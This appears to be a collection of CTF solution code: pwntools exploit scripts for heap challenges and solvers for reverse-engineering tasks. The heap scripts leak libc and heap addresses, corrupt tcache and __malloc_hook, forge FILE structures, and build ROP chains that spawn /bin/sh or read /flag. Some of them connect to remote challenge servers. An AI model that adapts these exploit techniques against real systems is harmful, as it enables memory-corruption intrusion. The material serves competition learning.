one_gadget = 0xf03a4 + libc.address
dele()
edit(0x10,p64(libc.sym['__malloc_hook']-0x23))

add(0x68,b"A"*8)
add(0x68,b"x00"*0x13 + p64(one_gadget))

p.sendlineafter("Please input your choice:","1")
p.sendlineafter("Please input the length of the diary content:",str(0x20))

# gdb.attach(p,"")
p.interactive()
```



```
typedef enum {
 PROTOBUF_C_TYPE_INT32,      /**< int32 */
 PROTOBUF_C_TYPE_SINT32,     /**< signed int32 */
 PROTOBUF_C_TYPE_SFIXED32,   /**< signed int32 (4 bytes) */
 PROTOBUF_C_TYPE_INT64,      /**< int64 */
 PROTOBUF_C_TYPE_SINT64,     /**< signed int64 */
 PROTOBUF_C_TYPE_SFIXED64,   /**< signed int64 (8 bytes) */
 PROTOBUF_C_TYPE_UINT32,     /**< unsigned int32 */
 PROTOBUF_C_TYPE_FIXED32,    /**< unsigned int32 (4 bytes) */
 PROTOBUF_C_TYPE_UINT64,     /**< unsigned int64 */
 PROTOBUF_C_TYPE_FIXED64,    /**< unsigned int64 (8 bytes) */
 PROTOBUF_C_TYPE_FLOAT,      /**< float */
 PROTOBUF_C_TYPE_DOUBLE,     /**< double */
 PROTOBUF_C_TYPE_BOOL,       /**< boolean */
 PROTOBUF_C_TYPE_ENUM,       /**< enumerated type */
 PROTOBUF_C_TYPE_STRING,     /**< UTF-8 or ASCII string */
 PROTOBUF_C_TYPE_BYTES,      /**< arbitrary byte sequence */
 PROTOBUF_C_TYPE_MESSAGE,    /**< nested message */
} ProtobufCType;
```



```
syntax="proto3";

message devicemsg{
    bytes whatcon = 1;
    sint64 whattodo = 2;
    sint64 whatidx = 3;
    sint64 whatsize = 4;
    uint32 whatsthis = 5;
}
```



```
from pwn import*
import pp_pb2

context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
libc_1 = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""
cont = pp_pb2.devicemsg()

def get_p(name):
    global p,elf 
    p = process(name,env={"LD_PRELOAD":"./libc.so.6 "})
    # p = remote("8.147.133.80",23682)
    elf = ELF(name)

def add(idx,mem):
    
    cont.whatcon=mem
    cont.whattodo=1
    cont.whatidx=idx
    cont.whatsize=0
    cont.whatsthis=0
    p.sendafter("WHAT DO YOU WANT?",cont.SerializeToString())

def show(idx):
    cont.whatcon=b"0"
    cont.whattodo=3
    cont.whatidx=idx
    cont.whatsize=0x20
    cont.whatsthis=0x20
    p.sendafter("WHAT DO YOU WANT?",cont.SerializeToString())

def dele(idx):
    cont.whatcon=b"B"*0xc0
    cont.whattodo=2
    cont.whatidx=idx
    cont.whatsize=0x20
    cont.whatsthis=0x20
    p.sendafter("WHAT DO YOU WANT?",cont.SerializeToString())

def clean(mem):
    cont.whatcon=mem
    cont.whattodo=0
    cont.whatidx=0
    cont.whatsize=0x20
    cont.whatsthis=0x20
    p.sendafter("WHAT DO YOU WANT?",cont.SerializeToString())
get_p("./pwn")
for i in range(9):
    add(i,b"A"*0x8)
# dele(0)
show(0)
libc_1.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x219ce0 - 0x1000

dele(0)
show(0)
p.recvuntil("Content:")
heap = u64(p.recv(5).ljust(0x8,b"x00")) * 0x1000 - 0x2000

print(hex(libc.address))
print(hex(heap))

for i in range(6):
    dele(i+1)

dele(7)
dele(8)
dele(7)

for i in range(7):
    add(i,b"A"*0x8)

environ = libc_1.sym['environ']
stdout = libc_1.sym['_IO_2_1_stdout_']
print(hex(environ))
add(7,p64((heap+0xf0) ^((heap+0x4e40)>>12)))

add(8,b"AAAAAA")
add(8,b"A")
add(8,p64(0)+p64(heap+0x10))
# # sleep(2)
# show(8)

# stack = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00"))
# print(hex(stack))

gdb.attach(p,"b *$rebase(0x001CBE)")
sleep(2)

clean((((p16(0)*2+p16(1)+p16(1)).ljust(0x10,b"x00")+p16(1)+p16(1)).ljust(0x90,b'x00')+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap+0x10)).ljust(0xe0,b"x00"))

raw_input()
clean(p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8))

stack = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x1a8 + 0x40
print(hex(stack))
raw_input()

clean((((p16(0)*2+p16(0)+p16(0)+p16(1)).ljust(0x10,b"x00")+p16(1)+p16(1)).ljust(0x90,b'x00')+p64(0)+p64(0)+p64(stack)).ljust(0xa0,b"x00"))

# libc_1.address = libc.address

pop_rdi = 0x000000000002a3e5 + libc_1.address
system = libc.sym['system'] + libc.address
binsh = next(libc_1.search(b"/bin/sh"))
ret = 0x000000000002a3e6 + libc_1.address

raw_input()

clean((p64(ret)*2+p64(pop_rdi)+p64(binsh)+p64(libc_1.sym['system'])).ljust(0x58,b"x00"))

p.interactive()
```



```
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("8.147.129.121",42446)
    elf = ELF(name)

def add(size,content):
    p.sendlineafter("choice >> ",'1')
    p.sendlineafter("size:",str(size))
    p.sendafter("content:",content)

def edit(idx,content):
    p.sendlineafter("choice >> ",'3')
    p.sendlineafter("idx:",str(idx))
    p.sendlineafter("size:",str(len(content)))
    p.sendafter("content:",content)  

def dele(idx):
    p.sendlineafter("choice >> ",'2')
    p.sendlineafter("idx:",str(idx))  

def show(idx):
    p.sendlineafter("choice >> ",'4')
    p.sendlineafter("idx:",str(idx))      
get_p("./EzHeap")

add(0x200,b"A"*0x8)
add(0x440,b"AAAA")
add(0x440,b"AAAAAA")
dele(1)
edit(0,b"A"*0x210)
show(0)

libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x21ace0
fd = libc.address + 0x21b0e0
edit(0,b"A"*0x200 + p64(0) + p64(0x451))

add(0x450,b"AAAAAA")

edit(0,b"A"*0x220)
show(0)
p.recvuntil("A"*0x220)
heap_addr = u64(p.recv(6).ljust(0x8,b"x00")) - 0x2510

print(hex(heap_addr))

edit(0,b"A"*0x200 + p64(0)+ p64(0x451)+p64(fd)*2)

add(0x440,b"AAAA")
dele(3)
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")

dele(13)
dele(12)
payload = b"A"*0x200 + p64(0) + p64(0x211) + p64((libc.sym['_IO_list_all']-0xa0)^((heap_addr + 0x25c0)>>12))
edit(0,payload)

add(0xa0,b"AAAA")

payload = p64(0x2185a0+libc.address) + p64(0x1bf3c0+libc.address) + p64(0x1be4c0+libc.address)+ p64(0x1beac0+libc.address) + p64(0x1da1c2+libc.address) *13 + p64(0)*3

add(0xa0,payload)

# for i in range(0x200//8):
# add(0x200,payload)

edit(13,payload+p64(heap_addr+0x2300))
fake_io_addr = heap_addr+0x2300
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
ret = 0x000000000002a3e6 + libc.address
ROP_addr = heap_addr + 0x2db0 + 0x10
setcontext = libc.sym['setcontext']
pop_rdi = 0x000000000002a3e5 + libc.address
pop_rdx =  0x000000000011f2e7 + libc.address
pop_rsi = 0x000000000002be51 + libc.address
pop_rax = 0x0000000000045eb0 + libc.address
syscall = 0x0000000000091316 + libc.address
FP = fake_io_addr
A = FP + 0x100
B = A + 0xe0 - 0x60

payload = (0xa0-0x10)*b"x00" + p64(A) # 
payload = payload.ljust(0xb0,b"x00") + p64(1)
payload = payload.ljust(0xc8,b"x00") + p64(_IO_wfile_jumps-0x40)
payload = payload.ljust(0x190,b"x00") + p64(ROP_addr) + p64(ret)
payload = payload.ljust(0xf0+0xe0,b"x00") + p64(B) + p64(setcontext + 61)

edit(0,payload)

payload = p64(pop_rax) + p64(2)  + p64(pop_rdi) + p64(ROP_addr+0x100) + p64(pop_rdx) + p64(0)*2 + p64(pop_rsi) + p64(0) + p64(syscall)
payload += p64(pop_rdi) + p64(3) + p64(pop_rdx) + p64(0x40) *2 + p64(pop_rsi) + p64(heap_addr+0x1000) + p64(libc.sym['read'])
payload += p64(pop_rdi) + p64(1) + p64(libc.sym['write'])

payload = payload.ljust(0x100,b"x00") + b"/flagx00"

edit(1,payload)

# gdb.attach(p,"b *&_IO_wfile_overflow")
# sleep(2)

p.sendlineafter("choice >> ",'5')
p.interactive()
```



```
v117 = encoding_base32__ptr_Encoding_DecodeString(qword_41A120, v116);
```



```
github_com_golang_protobuf_proto_Unmarshal(
             ptr,
             v117.0.len,
             cap,
             (unsigned int)off_2BD1C8,
             (_DWORD)p_mypackage_CTFBook,
             v26,
             v27,
             v28,
             v29,
             v82) )
```



```
v118 = encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->Title);
```



```
v119 = encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->Author);
```



```
v120 = encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->Isbn);
```



```
encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->PublishDate);
```



```
cont = bookProto_pb2.CTFBook()
cont.title = base64.b64encode(title)
cont.author = base64.b64encode(author)
cont.isbn = base64.b64encode(isbn)
cont.publish_date = base64.b64encode(date)
cont.price = 41
cont.stock = 1
payload = base64.b32encode(cont.SerializeToString())
```



```
struct book{
 char *title;
 char *Author;
 char *Isbon;
 char *PulishDate;
 float price;
 long int stcok;
}
```



```
from pwn import*
import base64
import bookProto_pb2
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

cont = bookProto_pb2.CTFBook()

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("8.147.133.230",40626)
    elf = ELF(name)

def add(idx,date,title=b"AA",author=b"AAAA",isbn=b"AAA"):
    p.sendlineafter("Enter your choice >","1")
    p.sendlineafter("Index:",str(idx))

    cont.title = base64.b64encode(title)
    cont.author = base64.b64encode(author)
    cont.isbn = base64.b64encode(isbn)
    cont.publish_date = base64.b64encode(date)
    cont.price = 41
    cont.stock = 1
    payload = base64.b32encode(cont.SerializeToString())
    p.sendlineafter("Special Data:",payload)

def edit(idx,date,title=b"AA",author=b"AAAA",isbn=b"AAA"):
    p.sendlineafter("Enter your choice >","4")
    p.sendlineafter("Index:",str(idx))

    cont.title = base64.b64encode(title)
    cont.author = base64.b64encode(author)
    cont.isbn = base64.b64encode(isbn)
    cont.publish_date = base64.b64encode(date)
    cont.price = 41
    cont.stock = 1
    payload = base64.b32encode(cont.SerializeToString())
    p.sendlineafter("Special Data:",payload)

def show(idx):
    p.sendlineafter("Enter your choice >","2")
    p.sendlineafter("Index:",str(idx))

def dele(idx):
    p.sendlineafter("Enter your choice >","3")
    p.sendlineafter("Index:",str(idx))    
get_p("./SuperHeap")
# sleep(2)
add(0,b"A"*0x20)
add(1,b"A"*0x430,title=b"BBBBB")
add(2,b"A"*0x430)
add(3,b"A"*0x430)

dele(2)
edit(0,b"A"*0x30)

show(0)
p.recvuntil("A"*0x30)

heap_addr = u64(p.recv(6).ljust(0x8,b"x00")) - 0x2e90

edit(0,b"A"*(0x70+0x440))
show(0)

libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x219ce0 - 0x1000
print(hex(heap_addr))
print(hex(libc.address))

payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(libc.sym['_IO_list_all']) + p64(0x4044800000000000) + p64(200)

edit(0,payload)

edit(1,p64(0x3730+heap_addr))
print(hex(libc.sym['_IO_list_all']))

payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(heap_addr+0x3730) + p64(0x4044800000000000) + p64(200)

edit(0,payload)

fake_io_addr = heap_addr + 0x3730
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
ROP_addr = heap_addr + 0x4000
ret = 0x000000000002a3e6 + libc.address
setcontext = libc.sym['setcontext']
pop_rdi = 0x000000000002a3e5 + libc.address
pop_rdx =  0x000000000011f2e7 + libc.address
pop_rsi = 0x000000000002be51 + libc.address

FP = fake_io_addr
A = FP + 0x100
B = A + 0xe0 - 0x60

payload = (0xa0-0x10)*b"x00" + p64(A) # 
payload = payload.ljust(0xb0,b"x00") + p64(1)
payload = payload.ljust(0xc8,b"x00") + p64(_IO_wfile_jumps-0x40)
payload = payload.ljust(0x190,b"x00") + p64(ROP_addr) + p64(ret)
payload = payload.ljust(0xf0+0xe0,b"x00") + p64(B) + p64(setcontext + 61)
edit(1,p64(0)*2+payload)

payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(heap_addr+0x4000) + p64(0x4044800000000000) + p64(200)

edit(0,payload)

payload = p64(pop_rdi) + p64(ROP_addr+0x100) + p64(pop_rdx) + p64(0)*2 + p64(pop_rsi) + p64(0) + p64(libc.sym['open'])
payload += p64(pop_rdi) + p64(3) + p64(pop_rdx) + p64(0x40) *2 + p64(pop_rsi) + p64(heap_addr+0x1000) + p64(libc.sym['read'])
payload += p64(pop_rdi) + p64(1) + p64(libc.sym['write'])

payload = payload.ljust(0x100,b"x00") + b"/flagx00"
edit(1,payload)

# gdb.attach(p,"b *$rebase(0x020D1C7)")
# sleep(2)

p.sendlineafter("Enter your choice >","6")
# payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(stack) + p64(0x4044800000000000) + p64(200)
# edit(0,payload)

p.interactive()
```



```
__int64 sub_0()
{
  __int64 v0; // x8
  __int64 v1; // x0
  _BYTE v3[4]; // [xsp+0h] [xbp-110h] BYREF
  unsigned int v4; // [xsp+4h] [xbp-10Ch]
  unsigned __int64 v5; // [xsp+8h] [xbp-108h]
  _BYTE *v6; // [xsp+10h] [xbp-100h]
  int k; // [xsp+18h] [xbp-F8h]
  int v8; // [xsp+1Ch] [xbp-F4h]
  int v9; // [xsp+20h] [xbp-F0h]
  int v10; // [xsp+24h] [xbp-ECh]
  int j; // [xsp+28h] [xbp-E8h]
  int v12; // [xsp+2Ch] [xbp-E4h]
  int v13; // [xsp+30h] [xbp-E0h]
  int i; // [xsp+34h] [xbp-DCh]
  __int64 v15; // [xsp+38h] [xbp-D8h]
  _BYTE *v16; // [xsp+40h] [xbp-D0h]
  int v17; // [xsp+4Ch] [xbp-C4h]
  __int64 v18; // [xsp+50h] [xbp-C0h]
  int v19; // [xsp+5Ch] [xbp-B4h]
  _DWORD v20[38]; // [xsp+60h] [xbp-B0h] BYREF
  __int64 v21; // [xsp+F8h] [xbp-18h]

  v21 = *MEMORY[0x1010];
  v19 = 0;
  v18 = 0xE84ui64;
  MEMORY[0x2A4](v20, 0xF10ui64, 152i64);
  v17 = MEMORY[0x2BC](0xE84ui64);
  v16 = v3;
  v5 = (4i64 * (unsigned int)(v17 + 1) + 15) & 0xFFFFFFFFFFFFFFF0ui64;
  MEMORY[0x1000]();
  v6 = &v3[-v5];
  v15 = v0;
  for ( i = 0; i < v17; ++i )
  {
    v13 = *(char *)(v18 + i);
    v12 = ((80 * v13 + 20) ^ 0x4D) + 30;
    *(_DWORD *)&v6[4 * i] = v12;
  }
  *(_DWORD *)&v6[4 * v17] = 0;
  for ( j = 0; j < v17; ++j )
  {
    v10 = *(char *)(v18 + j);
    v9 = ((80 * v10 + 20) ^ 0x4D) + 30;
    *(_DWORD *)&v6[4 * j] = v9;
  }
  MEMORY[0x2B0](0xEABui64);
  v8 = 1;
  for ( k = 0; k < v17; ++k )
  {
    if ( *(_DWORD *)&v6[4 * k] != v20[k] )
    {
      v8 = 0;
      break;
    }
  }
  if ( v8 )
    v1 = MEMORY[0x2B0](0xEADui64);
  else
    v1 = MEMORY[0x2B0](0xEDBui64);
  v19 = 0;
  v4 = 0;
  if ( *MEMORY[0x1010] != v21 )
    MEMORY[0x298](v1);
  return v4;
}
```



```
encode = [0xD7, 0x1F, 0x00, 0x00, 0xB7, 0x21, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x27, 0x20, 0x00, 0x00, 0xE7, 0x26, 0x00, 0x00, 0xD7, 0x10, 0x00, 0x00, 0x27, 0x11, 0x00, 0x00, 0x07, 0x20, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xF7, 0x11, 0x00, 0x00, 0x07, 0x20, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x17, 0x1F, 0x00, 0x00, 0xD7, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x67, 0x1F, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x17, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x47, 0x0F, 0x00, 0x00, 0x27, 0x11, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x87, 0x27, 0x00, 0x00]

data = []
for i in range(len(encode) // 4):
    data.append(int.from_bytes(encode[i*4:i*4+4],"little"))

for i in range(len(data)):
    data[i] -= 0x1e
    data[i] ^= 0x4d
    data[i] -= 0x14
    data[i] //= 0x50
print("".join(map(chr,data)))
```



```
package com.example.re11113;

import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

/* loaded from: classes3.dex */
public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    private EditText editText;

    private boolean legal(String paramString) {
        return paramString.length() == 38 && paramString.startsWith("flag{") && paramString.charAt(paramString.length() - 1) == '}' && !inspect.inspect(paramString.substring(5, paramString.length() - 1));
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0586R.layout.activity_main);
        this.editText = (EditText) findViewById(C0586R.C0589id.edit_text);
        ((Button) findViewById(C0586R.C0589id.Button)).setOnClickListener(this);
    }

    @Override // android.view.View.OnClickListener
    public void onClick(View v) {
        Log.d("Button ID", "Button ID: " + v.getId());
        switch (v.getId()) {
            case C0586R.C0589id.Button /* 2131230723 */:
                if (legal(this.editText.getText().toString())) {
                    Toast.makeText(this, "You are right.", 0).show();
                    return;
                } else {
                    Toast.makeText(this, "You are wrong.", 0).show();
                    return;
                }
            default:
                return;
        }
    }
}
```



```
package com.example.re11113;

import android.util.Base64;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/* loaded from: classes3.dex */
public class inspect {
    public static boolean inspect(String input_str) {
        try {
            byte[] input_flag = input_str.getBytes(StandardCharsets.UTF_8);
            byte[] str2 = jni.getkey().getBytes(StandardCharsets.UTF_8);
            Arrays.copyOf(str2, 8);
            SecretKeySpec key = new SecretKeySpec(str2, "AES");
            IvParameterSpec iv = new IvParameterSpec(jni.getiv().getBytes(StandardCharsets.UTF_8));
            Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
            cipher.init(1, key, iv);
            if (!Base64.encodeToString(cipher.doFinal(input_flag), 0).trim().equals("JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==")) {
                return true;
            }
            return false;
        } catch (Exception exception) {
            exception.printStackTrace();
            return true;
        }
    }
}
```



```
import whereThel1b

# flag = input("where is my flag:")
flag = 'flag{b2bb0873-8cae-4977-a6de-0e298f0744c3}' # 随便写
flag = flag.encode()
encry = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]
# print(len(encry)) 56
whereThel1b.whereistheflag(flag)
ret = whereThel1b.trytry(flag)
print(f'输入{ret}')
print(f'密文{encry}')
    
# 输入[108, 117, 72, 80, 64, 49, 100, 73, 82, 116, 120, 92, 94, 90, 113, 22, 64, 89, 56, 38, 81, 2, 64, 75, 127, 68, 115, 24, 125, 92, 106, 103, 95, 122, 94, 93, 113, 70, 46, 84, 92, 66, 82, 33, 104, 111, 84, 84, 80, 102, 102, 17, 73, 121, 125, 26]
# 密文[108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]
```



```
import whereThel1b

def check_flag(flag, encry, position):
    chr_list = '0123456789abcdef-{}'
    for ch1 in chr_list:
        for ch2 in chr_list:
            for ch3 in chr_list:
                new_flag = flag[:position] + ch1 + ch2 + ch3 + flag[position + 3:]
                new_flag_encoded = new_flag.encode()
                
                whereThel1b.whereistheflag(new_flag_encoded)
                ret = whereThel1b.trytry(new_flag_encoded)
                
                if ret[:((position // 3) + 1) * 4] == encry[:((position // 3) + 1) * 4]:
                    flag = new_flag
                    return flag

    return flag

def decrypt_flag():
    encrypted_flag = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]
    flag = 'flag{7xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}'

    for i in range(6, 42, 3):
        flag = check_flag(flag, encrypted_flag, i)

    return flag

decrypted_flag = decrypt_flag()
print(decrypted_flag)

# flag{7f9a2d3c-07de-11ef-be5e-cf1e88674c0b}
```



```
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v3; // eax
  void *v5; // rsp
  size_t v6; // rax
  size_t v7; // rax
  size_t v8; // rax
  size_t v9; // rax
  void *v10; // rsp
  size_t v11; // rax
  char v12; // bl
  size_t v13; // rax
  size_t v14; // rax
  void *v15; // rsp
  size_t v16; // rax
  __int64 v17[10]; // [rsp+0h] [rbp-130h] BYREF
  unsigned __int8 v18; // [rsp+55h] [rbp-DBh]
  char v19; // [rsp+56h] [rbp-DAh]
  char v20; // [rsp+57h] [rbp-D9h]
  unsigned __int64 ii; // [rsp+58h] [rbp-D8h]
  unsigned __int64 n; // [rsp+60h] [rbp-D0h]
  unsigned __int64 m; // [rsp+68h] [rbp-C8h]
  size_t k; // [rsp+70h] [rbp-C0h]
  unsigned __int64 j; // [rsp+78h] [rbp-B8h]
  unsigned __int64 i; // [rsp+80h] [rbp-B0h]
  size_t v27; // [rsp+88h] [rbp-A8h]
  __int64 *v28; // [rsp+90h] [rbp-A0h]
  void *ptr; // [rsp+98h] [rbp-98h]
  size_t v30; // [rsp+A0h] [rbp-90h]
  __int64 *v31; // [rsp+A8h] [rbp-88h]
  char *v32; // [rsp+B0h] [rbp-80h]
  char *s2; // [rsp+B8h] [rbp-78h]
  size_t v34; // [rsp+C0h] [rbp-70h]
  char *s1; // [rsp+C8h] [rbp-68h]
  char s[40]; // [rsp+D0h] [rbp-60h] BYREF
  unsigned __int64 v37; // [rsp+F8h] [rbp-38h]

  v37 = __readfsqword(0x28u);
  v3 = time(0LL);
  srand(v3 & 0xF0000000);
  puts("Please enter the flag string (ensuring the format is 'flag{}' and the total length is 38 characters).");
  __isoc99_scanf("%39s", s);
  if ( strlen(s) == '&' && s[0] == 'f' && s[1] == 'l' && s[2] == 'a' && s[3] == 'g' && s[4] == '{' && s[37] == '}' )
  {
    v27 = strlen(s);                            // 38
    v17[8] = v27 + 1;
    v17[9] = 0LL;
    v17[6] = v27 + 1;
    v17[7] = 0LL;
    v5 = alloca(16 * ((v27 + 16) / 0x10));
    v28 = v17;
    for ( i = 0LL; ; ++i )
    {
      v6 = strlen(s);
      if ( i >= v6 )
        break;
      v20 = rand();
      *((_BYTE *)v28 + i) = s[i] ^ v20;
    }
    v7 = strlen(s);
    ptr = malloc(v7);
    if ( ptr )
    {
      for ( j = 0LL; ; ++j )
      {
        v8 = strlen(s);
        if ( j >= v8 )
          break;
        *((_BYTE *)ptr + j) = j;
      }
      for ( k = strlen(s) - 1; k; --k )
      {
        v18 = rand() % (k + 1);
        v19 = *((_BYTE *)ptr + k);
        *((_BYTE *)ptr + k) = *((_BYTE *)ptr + v18);
        *((_BYTE *)ptr + v18) = v19;
      }
      v9 = strlen(s) + 1;
      v30 = v9 - 1;
      v17[4] = v9;
      v17[5] = 0LL;
      v17[2] = v9;
      v17[3] = 0LL;
      v10 = alloca(16 * ((v9 + 15) / 0x10));
      v31 = v17;
      for ( m = 0LL; ; ++m )
      {
        v11 = strlen(s);
        if ( m >= v11 )
          break;
        *((_BYTE *)v31 + m) = *((_BYTE *)v28 + *((unsigned __int8 *)ptr + m));// v28[ptr[m]]
      }
      for ( n = 0LL; ; ++n )
      {
        v13 = strlen(s);
        if ( n >= v13 )
          break;
        v12 = *((_BYTE *)v31 + n);
        *((_BYTE *)v31 + n) = rand() ^ v12;
      }
      putchar(10);
      v32 = byte_560F8AE010A0;
      s2 = "congratulationstoyoucongratulationstoy";
      v14 = strlen(byte_560F8AE010A0) + 1;
      v34 = v14 - 1;
      v17[0] = v14;
      v17[1] = 0LL;
      v15 = alloca(16 * ((v14 + 15) / 0x10));
      s1 = (char *)v17;
      for ( ii = 0LL; ; ++ii )
      {
        v16 = strlen(v32);
        if ( ii >= v16 )
          break;
        s1[ii] = *((_BYTE *)v31 + ii) ^ v32[ii];
      }
      if ( !strcmp(s1, s2) )
        puts("Correct.");
      else
        puts("Error. ");
      free(ptr);
      return 0LL;
    }
    else
    {
      fwrite("Memory allocation failed.n", 1uLL, 0x1AuLL, stderr);
      return 1LL;
    }
  }
  else
  {
    puts("The input format is incorrect or the length does not meet the requirements.");
    return 1LL;
  }
}
```



```
enc = list('congratulationstoyoucongratulationstoy')
list_55C3994010A0 = [0xBF, 0xD7, 0x2E, 0xDA, 0xEE, 0xA8, 0x1A, 0x10, 0x83, 0x73, 0xAC, 0xF1, 0x06, 0xBE, 0xAD, 0x88, 0x04, 0xD7, 0x12, 0xFE, 0xB5, 0xE2, 0x61, 0xB7, 0x3D, 0x07, 0x4A, 0xE8, 0x96, 0xA2, 0x9D, 0x4D, 0xBC, 0x81, 0x8C, 0xE9, 0x88, 0x78, 0x00, 0x00]

# a = [0xBF, 0x63, 0x79, 0xDA, 0xBC, 0x27, 0xB9, 0x86, 0x9B, 0x28, 0x04, 0xC1, 0x3C, 0x9E, 0x48, 0x03, 0xB2, 0xC7, 0x05, 0xAA, 0xAD, 0x4B, 0x1B, 0x3F, 0xF7, 0xCE, 0xBC, 0x5F, 0x79, 0x9C, 0x45, 0x46,0x87, 0xB4, 0xD2, 0x18, 0xC6, 0x19]
# input = list('flag{188cba3a5c0fbb2250b5a2e590c391ce}')
# rand1 = []
# for i in range(38):
#     rand1.append(a[i] ^ ord(input[i]))
# print(rand1)
rand1 = [217, 15, 24, 189, 199, 22, 129, 190, 248, 74, 101, 242, 93, 171, 43, 51, 212, 165, 103, 152, 159, 126, 43, 93, 194, 175, 142, 58, 76, 165, 117, 37, 180, 141, 227, 123, 163, 100]

# rand() % (k + 1);
v18 = [0x21, 0x00, 0x0a, 0x00, 0x20, 0x1f, 0x0a, 0x1d, 0x09, 0x18, 0x1a, 0x0b, 0x14, 0x18,
       0x15, 0x03, 0x0c, 0x0a, 0x0d, 0x02, 0x0f, 0x04, 0x0d, 0x0a, 0x08, 0x03, 0x03, 0x06,
       0x00, 0x04, 0x01, 0x01, 0x05, 0x04, 0x00, 0x00, 0x01]
ptr = [
    0x12, 0x0E, 0x1B, 0x1E, 0x11, 0x05, 0x07, 0x01, 0x10, 0x22, 0x06, 0x17, 0x16, 0x08, 0x19, 0x13, 0x04, 0x0F, 0x02, 0x0D, 0x25, 0x0C, 0x03, 0x15, 0x1C, 0x14, 0x0B, 0x1A, 0x18, 0x09, 0x1D, 0x23, 0x1F, 0x20, 0x24, 0x0A, 0x00, 0x21
]

